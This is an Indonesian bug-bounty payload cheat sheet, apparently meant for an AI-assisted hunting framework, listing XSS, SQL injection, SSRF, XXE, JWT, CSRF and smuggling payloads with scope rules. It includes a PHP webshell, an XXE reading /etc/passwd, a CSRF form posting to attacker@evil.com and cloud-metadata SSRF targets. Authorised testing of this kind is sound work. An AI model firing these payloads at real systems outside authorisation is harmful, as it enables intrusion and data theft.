# PAYLOAD-CHEATSHEET — Pustaka Payload & Bypass
### Dokumen pendamping #4 dari FRAMEWORK-BUGBOUNTY-AI.md
Rujukan cepat payload/teknik dari FRAMEWORK Bab 4 & 13. **Aturan pakai:** taruh marker/baseline dulu, ubah 1 variabel, uji aman, jangan destruktif/dump data, akun sendiri, in-scope ([[AI-OPERATING-RULES]] Bab 1-2). Payload adalah *lead*, bukan bukti — konteks & reproduksi yang menentukan.

---

## XSS
Input points: URL param · form field · header (User-Agent/Referer/X-Forwarded-For) · cookie · filename · JSON/XML · WebSocket.
```
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```
Per-konteks: HTML `<script>alert(1)</script>` · Attribute `" onload="alert(1)` · JS-string `'; alert(1); //` · URL `javascript:alert(1)`.
Filter bypass: case `<ScRiPt>` · tag alternatif (img/svg) · encoding (HTML entity/URL/Unicode) · null byte `<scri\0pt>` · comment `<!--><script>alert(1)-->`.
Restricted (URL-encode di body): `%22`=" `%2F`=/ `%3E`=> `%3C`=< `%23`=# → mis. `title=x%22%2F%3E%3Csvg onload=alert(1)%3E`.
DOM: source `location.hash/search`,`document.referrer`,`postMessage`,storage → sink `innerHTML`,`document.write`,`eval`,`setTimeout`(string). Fragment PoC: `#<img src=x onerror=alert(1)>`.
Blind XSS: kirim ke field yang dibaca admin/log → callback ke domain sendiri (xss.report / Interactsh). Bukti = eksekusi di konteks internal.

## SQL Injection (bukti time-based/boolean/metadata saja; JANGAN dump)
```
'    "    ' OR '1'='1    ' OR '1'='1' --    ' OR '1'='1' #    admin' --    admin' #
' UNION SELECT NULL--            ' UNION SELECT NULL,NULL--
' AND SLEEP(5)--   (MySQL)       ' OR pg_sleep(5)--  (Postgres)   '; WAITFOR DELAY '00:00:05'--  (MSSQL)
```
Bukti andal = paired request (normal→delay→normal). WAF bypass: `/**/` (`' OR/**/1=1#`), whitespace `%09 %0A %0B %0C %0D`, encoding, case, `' AND/**/SLEEP(5)#`. Second-order: input disimpan di A, tereksekusi di query B (report/export). Tool: ghauri (time-based). Fix: prepared statement.

## IDOR / Access control (2 akun sendiri)
ID di: URL, UUID, base64/hex, POST body, cookie, header. Metode: A capture → B replay ID objek A (dua arah). URL param: `?user_id=1` → `?user_id=admin`. Request: `POST /users/123` → `POST /users/admin`. Naikkan impact: dokumentasikan PII persis; uji endpoint sejenis (`/api/users/{id}`,`/invoices/{id}`,`/tracking/{id}`).

## SSRF (konfirmasi outbound via collaborator dulu)
Surface/field: `url,callback,webhook,avatar,feed,endpoint`; image import, PDF/preview, importer, XML.
```
url=http://<collaborator>/test            # konfirmasi outbound
http://169.254.169.254/latest/meta-data/  # metadata (jangan pakai creds)
http://127.0.0.1:6379  http://localhost   # internal
```
Bypass: redirect, DNS rebinding, format alamat alternatif (blok 127.0.0.1 tapi lolos setara). Severity by reach.

## File upload
Uji: MIME vs ekstensi · double extension · null byte · path traversal filename `../` · magic byte.
```
Content-Type: image/jpeg    (atau prepend magic byte)  GIF89a
SVG-XSS:  <svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
SVG-XXE:  <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
          <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```
RCE-upload (HANYA in-scope, PoC minimal, hapus setelahnya): webshell `<?php system($_REQUEST['cmd']); ?>` → cek eksekusi via endpoint upload.

## Auth / JWT / Session
Reset token: uji prediktabilitas (sequential), rate limit, token terikat email server-side (jangan percaya param email).
JWT: `alg:none` · algorithm confusion (RS256→HS256 pakai public key `/jwks.json` sbg secret) · weak HMAC secret (hashcat, akun sendiri) · signature/expiry tak dicek.
2FA token-reuse: bandingkan token/response pra vs pasca-2FA; jika sama, uji ganti response gagal→sukses.
Session: token berubah setelah login/reset/ubah-email/2FA/logout? token lama mati setelah ganti password? session fixation? concurrent session?

## CSRF & Clickjacking
State-changing: ubah email/password, hapus akun, disable 2FA, payout, API key, invite.
```html
<form action="https://target/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com"></form>
<script>document.forms[0].submit();</script>
```
Clickjacking: cek `X-Frame-Options` / CSP `frame-ancestors`.

## GraphQL
Introspection: query `__schema` → types/queries/mutations. Uji field-level authz per role (billing/audit/admin flag). Mutation tersembunyi (`updateUserRole`). Nested-query berat = risiko DoS (uji kecil/terkontrol).

## Advanced (LAB dulu; in-scope)
SSTI deteksi: `{{7*7}}` / `${7*7}` → 49. Prototype pollution: `{"__proto__":{"polluted":"yes"}}` → cek `Object.prototype.polluted`. Mass assignment: kirim `role`,`isAdmin`,`credit`,`organizationId`. XXE OOB:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<collaborator>/xxe"> %xxe; ]>
```
Race condition: Turbo Intruder request paralel pada aksi "only once" (coupon/withdraw/stock/invite/2FA disable).

## Header / infra
Rate-limit bypass (jangan flood): `X-Forwarded-For:`, `X-Real-IP:`. Host header injection: `Host: attacker.com`. HTTP smuggling: POST + HTTP/1.1, `Content-Length` + `Transfer-Encoding: chunked` + body `0` (efek bisa kena user lain → hati-hati scope). IDN homograph: uji bila app terima domain IDN (lihat FRAMEWORK Bab 13.7).

## gf patterns (cari cepat di list URL)
```
cat urls.txt | gf ssrf ; gf xss ; gf redirect ; gf sqli ; gf lfi ; gf idor
```

Terkait: [[FRAMEWORK-BUGBOUNTY-AI]] Bab 4/9/13 · [[AI-OPERATING-RULES]] Bab 2 · [[RECON-RUNBOOK]]
